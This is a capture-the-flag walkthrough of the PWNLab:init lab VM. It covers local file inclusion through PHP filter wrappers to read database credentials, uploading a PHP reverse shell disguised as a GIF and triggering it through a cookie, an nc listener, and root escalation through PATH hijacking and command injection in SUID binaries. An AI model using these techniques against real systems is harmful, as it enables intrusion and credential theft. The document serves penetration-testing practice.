# PWNLab-int-Walk-through

# Get VM’s IP

nmap 192.168.1.0/24

Victim’s IP: 192.168.1.3

# Enumeration

nmap -sC -sV --script vuln 192.168.1.3 

![image](https://user-images.githubusercontent.com/52453415/128316077-905e93b6-d58e-43b6-95d9-f6a3186b9ab9.png)

/config.php: PHP Config file may contain database IDs and passwords

None of the services running is vulnerable ! 

navigate to 192.168.1.3/config.php : blank page or as it seems to be 

# Scanning the web server

![image](https://user-images.githubusercontent.com/52453415/128316329-0c951fbd-8842-4809-b64f-6138cd468eb8.png)

![image](https://user-images.githubusercontent.com/52453415/128316453-ececb5fa-8a1b-4f03-9e16-fd79782d7dee.png)

# My first thought is [ we get credentials through sql injection or LFI to login , then upload shell to the server ]

let's see 

trying default credentials don't work 

trying sqli commands in user and pass fields don't work 

![image](https://user-images.githubusercontent.com/52453415/128323356-d6686b5a-0b46-4a5e-bd27-e61862a6bcbc.png)


trying sqlmap for get parameter page don't work 

trying sqlmap for post parameters user and pass don't work 

# the server is not vulnerable to sqli 

# brute force sql server for use name and pass using hydra 

my ip got block from the machine due to requests



checking the source page : nothing useful

![image](https://user-images.githubusercontent.com/52453415/128318327-fcab2539-02af-4d74-8c2b-e3cdc5958471.png)


# trying LFI fuzzing 

through ffuf : the server answers all requests with status 200 


# using dirbuster for LFI 



using dirbuster , brought me this result 

![image](https://user-images.githubusercontent.com/52453415/128321453-a6836a56-b1eb-43e3-bd7c-b2a8ec98936b.png)

![image](https://user-images.githubusercontent.com/52453415/128321522-14bc42e6-a3e1-409b-b193-2bfbd4cdf04c.png)

 surfing the files ; they all blank! or that what they seem to be ! 

then we must use some sort of wrappers to view these files 

# using my custom made script that uses wrappers , wget and verify content for each payload

i found this amazing result 

![image](https://user-images.githubusercontent.com/52453415/128322063-8575d36a-a19c-4de6-bb3c-5026692a1844.png)

sounds like these wrappers work 

http://192.168.1.3/?page=php://filter/convert.base64-encode/resource=config

![image](https://user-images.githubusercontent.com/52453415/128322623-a3c75c3e-edfa-4642-8267-c544973345be.png)

decoding the base64 

![image](https://user-images.githubusercontent.com/52453415/128322685-69d2e8c5-cdfd-4000-b8f7-5267a350074a.png)

we got the sql root credentials 

this wrapper works too , we need to rot13 the content 

http://192.168.1.3/?page=php://filter/read=string.rot13/resource=config

![image](https://user-images.githubusercontent.com/52453415/128323023-ff5e518c-68a8-4beb-8c41-c0f419356775.png)

or even better this wrapper, need nothing else 

http://192.168.1.3/?page=php://filter/convert.iconv.utf-8.utf-16/resource=config

![image](https://user-images.githubusercontent.com/52453415/128323242-c973f3ae-8709-47ed-aaaf-b14667b95aba.png)

using the base64 wrapper for all files we found 

index file


![image](https://user-images.githubusercontent.com/52453415/128323936-b4a0ec0d-f053-48a1-a45e-5a7bc52ab6fb.png)

 if we set a cookie with name _lang _ pointing to a file in the file system, it will be included. We don’t even need to worry about it not ending in .php!
 
upload file

![image](https://user-images.githubusercontent.com/52453415/128324348-c1139c31-70f8-4e85-bca2-a3560f56bce5.png)

these is the the retractation for uploading files to the server 

so what is mime type ? 

![image](https://user-images.githubusercontent.com/52453415/128469918-ab75217e-b1a2-4ae9-8d57-0327974f0172.png)

it's a signature for each file format 

so 

Err 0: Whitelist for files ending with .jpg, ,jpeg, .gif and .png

Err 1: File is not identified as an image

Err 2: HEX signature validation?

Err 3: File name contains ‘/’ 

Err 4: Failed to upload file


![image](https://user-images.githubusercontent.com/52453415/128324436-944dac2e-0294-44ee-a79b-83cf3741af1a.png)




# accessing My SQL 

![image](https://user-images.githubusercontent.com/52453415/128470121-c4289d78-8c22-4f37-b0b2-c902b78be912.png)

show the table and it's content 

![image](https://user-images.githubusercontent.com/52453415/128470200-2fa65452-3197-410b-a15c-88a54917efff.png)

![image](https://user-images.githubusercontent.com/52453415/128470233-eca72a5a-dfc0-47bc-996d-a449bc607492.png)

now we got our credentials we need that are encoded with base64 ; if u don't recognize the format just google the password and it will tell you 

before exiting my sql i've tried to install sys_exec function that could be use to gain shell and priv escalation 
but i failed 

![image](https://user-images.githubusercontent.com/52453415/128470483-882c5f67-a98f-44e2-a753-fc5dc20e7cb9.png)

# back to web server 

login with them all to make sure if any one has more priv , they all equal 


![image](https://user-images.githubusercontent.com/52453415/128470895-ed90cdfa-492a-4ac7-acb4-1e588af7c48d.png)

i've uploaded legitime image first and intercepted the traffic using burpsuite

![image](https://user-images.githubusercontent.com/52453415/128471163-558d14a1-fd66-41cc-8b8e-0f23736254ac.png)

these pointers is what is being checked from the server and any change would generate one of the four errors we saw in upload file

then viewing the image would tell us the directory in which the image got saved

../upload/32d3ca5e23f4ccf1e4c8660c40e75f33.png

 and it's name which turned to be it's md5 hash 

![image](https://user-images.githubusercontent.com/52453415/128471443-d7e93f41-91f5-4752-bf80-e70e6fb86175.png)

now time to upload our shell 

I've searched the web for "php reverse shell in image" and I've learned that i should put the reverse shell and gif image signature to bypass the check done by the server which is GIF89a;

![image](https://user-images.githubusercontent.com/52453415/128472458-8d939331-cc4c-4962-bb91-e66e4c7b990b.png) 

so i've created fake image included this tip and uploaded it  

now that we have uploaded the shell we need it to be executed by the server 

remember that index file ? it says if the cookie is lang then call the include function , which GET " any thing in the cookie and add .php to it 

![image](https://user-images.githubusercontent.com/52453415/128474050-a5944006-58de-4efd-b2a4-6ca523e5fb25.png)

so i set the listener first nc -nlvp 4444


then i intercept  regular request to the server changing the cookie to lang and our png path 

![image](https://user-images.githubusercontent.com/52453415/128474341-bd15877b-e2e8-46e6-a7f9-83cfb6be73fe.png)


we got our www user shell 

![image](https://user-images.githubusercontent.com/52453415/128474154-6eb88159-bdc6-4dbe-a075-bb36e3d41d31.png)

upgrade the shell to be interactive 

![image](https://user-images.githubusercontent.com/52453415/128517280-6daa8232-7150-408d-a2ad-0cd528fc7aa3.png)

uname -a and search for kernel vulnerability ; nothing found 

switching to mike 

su mike ; credential is not as sql table 

switching to kane ; logged in 

![image](https://user-images.githubusercontent.com/52453415/128517527-b4dff7d0-87fe-4cd1-9765-3145478a0ddf.png)

find an executable file name msgmike 

strings msgmike 

![image](https://user-images.githubusercontent.com/52453415/128517656-e4677554-6741-441b-88d8-ee9dd8d0fd16.png)

i searched for vulnerability for this library 

![image](https://user-images.githubusercontent.com/52453415/128517844-75239da4-3818-485d-a7ff-6d4852880b74.png)

mirror the exploit and transfer it via nc to the target ; compile it ; i find this error 

error: 'for' loop initial declarations are only allowed in C99 ...

then to solve we must do this 

![image](https://user-images.githubusercontent.com/52453415/128518309-ce331101-3272-4d2d-bc4b-ff6f8e32b55f.png)

compile and run 

![image](https://user-images.githubusercontent.com/52453415/128518371-c14da059-79b3-45f6-b67f-25e810bea01d.png)

the exploit couldn't create user namespace ; i tried to create one manually it's not permitted too

so this exploit won't work and the vertical priv esc failed let look for horizontal priv esc

back to the executable msgmike ; execute it displays this error 

cat: /home/mike/msg.txt: No such file or directory

which means that this executable that own by "mike" uses the command cat to disply file

think of this { if we write a command to terminal it will search first at the environment if the programmer uses the command without it's full path the system will execute the first thing found with the same name )

the full path for cat binary is /usr/bin/cat ; if the programmer uses cat directly it would be a weakness in the code we can take advantage of 

1- make script to be executed

2-let the system find it first before the real command 

we will create bash script to open terminal and name it cat 

kane@pwnlab:~$ echo "/bin/bash" > cat  

kane@pwnlab:~$ chmod 755 cat  

kane@pwnlab:~$ export PATH=/home/kane 

kane@pwnlab:~$ ./msgmike  

./msgmike  

bash: dircolors: command not found  

bash: ls: command not found  

mike@pwnlab:~$   


mike@pwnlab:~$ cd ../mike  

cd ../mike  

mike@pwnlab:/home/mike$ ls -al

no such command !!! 

yea we forgot to fix the environment path 

mike@pwnlab:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  

ls -al 

-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root  

another excutable but this time is owned by the root 

strings msg2root 

![image](https://user-images.githubusercontent.com/52453415/128520599-ea7b62a1-4e87-458f-b994-e88ae8afa598.png)
 
 
![image](https://user-images.githubusercontent.com/52453415/128520698-0cfc2d63-921c-4852-a83b-84e531173781.png)

sounds like it take whatever we write and print it ; this might be vulnerable to input attack ; command injection and since the executable is own by the root any command to be injected may run as root

let's try to open a bash that own by the root

![image](https://user-images.githubusercontent.com/52453415/128521287-86287fb8-092e-4f6a-a386-f339fd276f4d.png)


bash-4.3# whoami  
  
root  






